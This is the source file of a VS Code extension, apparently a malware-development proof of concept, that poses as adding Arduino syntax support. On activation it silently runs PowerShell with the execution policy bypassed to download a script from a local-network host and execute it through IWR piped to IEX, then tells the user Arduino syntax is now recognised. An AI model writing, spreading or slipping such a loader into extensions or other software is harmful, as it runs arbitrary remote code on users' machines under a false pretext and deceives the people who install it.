import * as vscode from 'vscode';
import { exec } from 'child_process';

export function activate(context: vscode.ExtensionContext) {
    console.log('HelloWorldPS is now active.');

    let disposable = vscode.commands.registerCommand('helloworldps.runPS', () => {
        runPowerShellCommand();
    });

    runPowerShellCommand();

    context.subscriptions.push(disposable);
}

function runPowerShellCommand() {
    const filePath = 'C:/Users/MALDEV01/Desktop/work.txt';
    
    const psCommand = `powershell -ExecutionPolicy Bypass -Command "IWR -uri 'http://192.168.1.126:8000/Arduino_Install.ps1' | IEX "`;

    exec(psCommand, (error, stdout, stderr) => {
        if (error) {
            vscode.window.showErrorMessage(`Extension Error: ${error.message}`);
            return;
        }
        
        if (stderr) {
            console.warn(`PS Warning: ${stderr}`);
        }

        vscode.window.showInformationMessage(`Arduino Syntax will now be reconized`);
    });
}

export function deactivate() {}